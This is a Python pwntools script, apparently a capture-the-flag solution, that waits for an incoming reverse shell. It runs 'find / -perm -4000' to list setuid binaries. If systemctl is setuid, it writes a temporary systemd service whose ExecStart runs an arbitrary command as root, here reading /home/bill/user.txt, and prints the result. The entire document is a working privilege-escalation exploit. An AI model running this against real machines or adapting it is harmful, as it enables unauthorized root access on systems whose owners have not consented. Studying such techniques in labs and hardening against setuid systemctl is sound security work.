import sys
from pwn import *

def main():
    if(len(sys.argv) < 2):
        print(f'Usage: {sys.argv[0]} LISTEN_PORT')
        return
    l = listen(sys.argv[1], fam='ipv4', typ='tcp')
    c = l.wait_for_connection()
    while(l.recvline(timeout=1) != b''):
        pass
    END = b'_x_x_x_\n'
    l.send(b'echo $(find / -perm -4000 2>/dev/null); echo ' + END)
    data = None
    data = l.recvuntil(END, drop=True)
    programs = data.decode('utf-8').split()
    target_program = 'systemctl'
    for p in programs:
        if target_program in p:
            print(f'Found match: {p}')
            break
    else:
        print('Not found target program')
        return

    payload = b'cat /home/bill/user.txt'
    print(f'[PAYLOAD] Executing: {payload}')

    res_file = b'/tmp/xxx'
    payload += b' > ' + res_file
    l.send(b'''F=$(mktemp).service && echo "
[Unit]
After=network.target
[Service]
ExecStart=/bin/bash -c \' ''' + payload + b'''\'
[Install]
WantedBy = multi-user.target" > $F && systemctl enable --now $F; echo ''' + END)
    data = l.recvuntil(END, drop=True)
    print(f"[PAYLOAD] Execution log:\n{data.decode('utf-8')}")
    
    l.send(b'cat ' + res_file + b'; echo ' + END)
    data = l.recvuntil(END, drop=True)
    print(f"[PAYLOAD] Result:\n{data.decode('utf-8')}")

main()
